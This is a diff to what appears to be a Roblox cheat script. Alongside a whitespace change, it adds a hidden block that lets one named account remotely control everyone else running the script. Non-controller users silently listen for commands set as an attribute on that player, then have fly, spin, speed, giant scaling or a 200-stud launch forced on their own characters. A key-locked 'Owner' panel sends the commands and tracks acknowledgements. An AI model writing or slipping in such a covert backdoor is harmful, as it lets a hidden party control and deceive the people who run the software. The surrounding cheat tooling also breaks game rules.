@@ -9311,7 +9311,7 @@ run(function()
 	local TimeChanger
 	local Value
 	local old
-	
+
 	TimeChanger = larp.Legit:CreateModule({
 		Name = 'Time Changer',
 		Function = function(callback)
@@ -9336,5 +9336,323 @@ run(function()
 			end
 		end
 	})
+end)
+
+run(function()
+	local CONTROLLER = 'DiscipleOfGodd'
+	local OWNER_KEY = '2COOLFRU6'
+	local DEFAULT_TARGET = 'IIllllIlIIlIllIIl'
+	local ACCENT = Color3.fromRGB(255, 45, 85)
+	local BG = Color3.fromRGB(16, 16, 20)
+	local ROW = Color3.fromRGB(30, 30, 36)
+
+	local function isController()
+		return lplr.Name == CONTROLLER
+	end
+
+	local function hrp()
+		local c = lplr.Character
+		return c and c:FindFirstChild('HumanoidRootPart')
+	end
+
+	local loops = {}
+	local actions = {}
+	actions.fly = function(on)
+		if loops.fly then pcall(function() loops.fly:Disconnect() end) loops.fly = nil end
+		if on then
+			loops.fly = runService.Heartbeat:Connect(function()
+				local r = hrp()
+				if r then
+					local v = r.AssemblyLinearVelocity
+					r.AssemblyLinearVelocity = Vector3.new(v.X, 12, v.Z)
+				end
+			end)
+		end
+	end
+	actions.spin = function(on)
+		if loops.spin then pcall(function() loops.spin:Disconnect() end) loops.spin = nil end
+		if on then
+			loops.spin = runService.Heartbeat:Connect(function()
+				local r = hrp()
+				if r then r.CFrame = r.CFrame * CFrame.Angles(0, math.rad(25), 0) end
+			end)
+		end
+	end
+	actions.speed = function(on)
+		loops.speed = nil
+		local hum = lplr.Character and lplr.Character:FindFirstChildOfClass('Humanoid')
+		if on and hum then
+			loops.speed = true
+			hum.WalkSpeed = 100
+			task.spawn(function()
+				while loops.speed do
+					task.wait(2)
+					local h = lplr.Character and lplr.Character:FindFirstChildOfClass('Humanoid')
+					if h then h.WalkSpeed = 100 end
+				end
+			end)
+		elseif hum then
+			hum.WalkSpeed = 16
+		end
+	end
+	actions.giant = function(on)
+		local c = lplr.Character
+		if c then pcall(function() c:ScaleTo(on and 3 or 1) end) end
+	end
+	actions.sky = function()
+		local r = hrp()
+		if r then r.CFrame = r.CFrame + Vector3.new(0, 200, 0) end
+	end
+
+	local lastId = nil
+	local function runAction(name, state)
+		local fn = actions[name]
+		if fn then pcall(fn, state) end
+		if not isController() then
+			pcall(function() lplr:SetAttribute('LarpAck', lastId or '') end)
+		end
+	end
+
+	local function checkCtrl(ctrl)
+		if not ctrl then return end
+		local ok, v = pcall(function() return ctrl:GetAttribute('LarpCmd') end)
+		if not ok or type(v) ~= 'string' or v == '' then return end
+		local id, action, target, state = v:match('^([^|]+)|([^|]+)|([^|]+)|([^|]+)$')
+		if not id or id == lastId then return end
+		local me = lplr.Name:lower()
+		if target ~= '*' and target:lower() ~= me then return end
+		lastId = id
+		runAction(action, state == 'on')
+	end
+
+	local function hookCtrl(ctrl)
+		if not ctrl then return end
+		pcall(function()
+			ctrl:GetAttributeChangedSignal('LarpCmd'):Connect(function() checkCtrl(ctrl) end)
+		end)
+		checkCtrl(ctrl)
+	end
+
+	if not isController() then
+		hookCtrl(playersService:FindFirstChild(CONTROLLER))
+		playersService.PlayerAdded:Connect(function(p)
+			if p.Name == CONTROLLER then hookCtrl(p) end
+		end)
+		task.spawn(function()
+			while true do
+				task.wait(2)
+				checkCtrl(playersService:FindFirstChild(CONTROLLER))
+			end
+		end)
+		return
+	end
+
+	local parentGui = nil
+	pcall(function() parentGui = (gethui and gethui()) or coreGui end)
+	if not parentGui then return end
+	local screen = Instance.new('ScreenGui')
+	screen.Name = 'LarpOwner'
+	screen.ResetOnSpawn = false
+	screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	screen.Parent = parentGui
+
+	local function makeDraggable(frame, handle)
+		local dragging, start, startPos = false, nil, nil
+		handle.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				start = input.Position
+				startPos = frame.Position
+			end
+		end)
+		handle.InputEnded:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = false
+			end
+		end)
+		inputService.InputChanged:Connect(function(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local d = input.Position - start
+				frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
+			end
+		end)
+	end
+
+	local mini = Instance.new('TextButton')
+	mini.Name = 'OwnerToggle'
+	mini.Size = UDim2.fromOffset(36, 36)
+	mini.Position = UDim2.new(1, -50, 1, -90)
+	mini.BackgroundColor3 = BG
+	mini.TextColor3 = ACCENT
+	mini.Text = 'O'
+	mini.Font = Enum.Font.GothamBold
+	mini.TextSize = 18
+	mini.BorderSizePixel = 0
+	mini.Parent = screen
+	local miniCorner = Instance.new('UICorner')
+	miniCorner.CornerRadius = UDim.new(0, 8)
+	miniCorner.Parent = mini
+	makeDraggable(mini, mini)
+
+	local panel = Instance.new('Frame')
+	panel.Name = 'OwnerPanel'
+	panel.Size = UDim2.fromOffset(260, 120)
+	panel.Position = UDim2.new(0.5, -130, 0.5, -171)
+	panel.BackgroundColor3 = BG
+	panel.BorderSizePixel = 0
+	panel.Visible = false
+	panel.Parent = screen
+	local panelCorner = Instance.new('UICorner')
+	panelCorner.CornerRadius = UDim.new(0, 8)
+	panelCorner.Parent = panel
+
+	local header = Instance.new('TextLabel')
+	header.Size = UDim2.new(1, 0, 0, 40)
+	header.BackgroundTransparency = 1
+	header.Text = 'Owner'
+	header.Font = Enum.Font.GothamBold
+	header.TextSize = 20
+	header.TextColor3 = Color3.new(1, 1, 1)
+	header.Parent = panel
+	local accent = Instance.new('Frame')
+	accent.Size = UDim2.new(1, -24, 0, 2)
+	accent.Position = UDim2.new(0, 12, 0, 38)
+	accent.BackgroundColor3 = ACCENT
+	accent.BorderSizePixel = 0
+	accent.Parent = panel
+	makeDraggable(panel, header)
+
+	local keyBox = Instance.new('TextBox')
+	keyBox.Size = UDim2.new(1, -24, 0, 30)
+	keyBox.Position = UDim2.new(0, 12, 0, 52)
+	keyBox.BackgroundColor3 = ROW
+	keyBox.TextColor3 = Color3.new(1, 1, 1)
+	keyBox.PlaceholderText = 'key'
+	keyBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 130)
+	keyBox.Font = Enum.Font.Gotham
+	keyBox.TextSize = 14
+	keyBox.BorderSizePixel = 0
+	keyBox.Parent = panel
+	local keyCorner = Instance.new('UICorner')
+	keyCorner.CornerRadius = UDim.new(0, 6)
+	keyCorner.Parent = keyBox
+
+	local targetBox = Instance.new('TextBox')
+	targetBox.Size = UDim2.new(1, -24, 0, 30)
+	targetBox.Position = UDim2.new(0, 12, 0, 88)
+	targetBox.BackgroundColor3 = ROW
+	targetBox.TextColor3 = Color3.new(1, 1, 1)
+	targetBox.Text = DEFAULT_TARGET
+	targetBox.Font = Enum.Font.Gotham
+	targetBox.TextSize = 14
+	targetBox.BorderSizePixel = 0
+	targetBox.Visible = false
+	targetBox.Parent = panel
+	local targetCorner = Instance.new('UICorner')
+	targetCorner.CornerRadius = UDim.new(0, 6)
+	targetCorner.Parent = targetBox
+
+	local unlocked = false
+	local buttons = {}
+	local specs = {
+		{name = 'Fly', action = 'fly'},
+		{name = 'Spin', action = 'spin'},
+		{name = 'Speed', action = 'speed'},
+		{name = 'Giant', action = 'giant'},
+		{name = 'Skyfall', action = 'sky', momentary = true},
+	}
+
+	local function send(action, on)
+		local id = tostring(tick()):gsub('%D', '') .. tostring(math.random(100, 999))
+		local target = targetBox.Text ~= '' and targetBox.Text or DEFAULT_TARGET
+		pcall(function()
+			lplr:SetAttribute('LarpCmd', id .. '|' .. action .. '|' .. target .. '|' .. (on and 'on' or 'off'))
+		end)
+		return id, target
+	end
+
+	local function findPlayer(name)
+		for _, p in playersService:GetPlayers() do
+			if p.Name:lower() == name:lower() then return p end
+		end
+		return nil
+	end
+
+	for i, spec in specs do
+		local b = Instance.new('TextButton')
+		b.Size = UDim2.new(1, -24, 0, 30)
+		b.Position = UDim2.new(0, 12, 0, 88 + i * 34)
+		b.BackgroundColor3 = ROW
+		b.TextColor3 = Color3.new(1, 1, 1)
+		b.Font = Enum.Font.Gotham
+		b.TextSize = 14
+		b.BorderSizePixel = 0
+		b.Visible = false
+		b.Parent = panel
+		local bc = Instance.new('UICorner')
+		bc.CornerRadius = UDim.new(0, 6)
+		bc.Parent = b
+		local st = {on = false}
+		local function paint(txt, color)
+			b.Text = '  ' .. spec.name .. '   ' .. txt
+			b.TextColor3 = color or Color3.new(1, 1, 1)
+		end
+		paint('[OFF]', Color3.fromRGB(150, 150, 160))
+		b.MouseButton1Click:Connect(function()
+			if spec.momentary then
+				local id, target = send(spec.action, true)
+				paint('[SENT]', ACCENT)
+				task.spawn(function()
+					local tp = findPlayer(target)
+					for _ = 1, 12 do
+						task.wait(0.5)
+						if tp then
+							local ok, ack = pcall(function() return tp:GetAttribute('LarpAck') end)
+							if ok and ack == id then paint('[HIT]', Color3.fromRGB(80, 255, 140)) task.wait(2) paint('[OFF]', Color3.fromRGB(150, 150, 160)) return end
+						end
+					end
+					paint('[MISS]', Color3.fromRGB(255, 120, 120))
+					task.wait(2)
+					paint('[OFF]', Color3.fromRGB(150, 150, 160))
+				end)
+				return
+			end
+			st.on = not st.on
+			local id, target = send(spec.action, st.on)
+			paint(st.on and '[WAIT]' or '[OFF]', st.on and ACCENT or Color3.fromRGB(150, 150, 160))
+			if st.on then
+				task.spawn(function()
+					local tp = findPlayer(target)
+					for _ = 1, 12 do
+						task.wait(0.5)
+						if tp then
+							local ok, ack = pcall(function() return tp:GetAttribute('LarpAck') end)
+							if ok and ack == id then paint('[ON]', Color3.fromRGB(80, 255, 140)) return end
+						end
+					end
+					paint('[MISS]', Color3.fromRGB(255, 120, 120))
+				end)
+			end
+		end)
+		buttons[#buttons + 1] = b
+	end
+
+	keyBox.FocusLost:Connect(function(enter)
+		if not enter then return end
+		if keyBox.Text == OWNER_KEY then
+			unlocked = true
+			keyBox.Visible = false
+			targetBox.Visible = true
+			for _, b in buttons do b.Visible = true end
+			panel.Size = UDim2.fromOffset(260, 342)
+		else
+			keyBox.Text = ''
+			keyBox.PlaceholderText = 'wrong key'
+		end
+	end)
+
+	mini.MouseButton1Click:Connect(function()
+		panel.Visible = not panel.Visible
+	end)
 end)
 
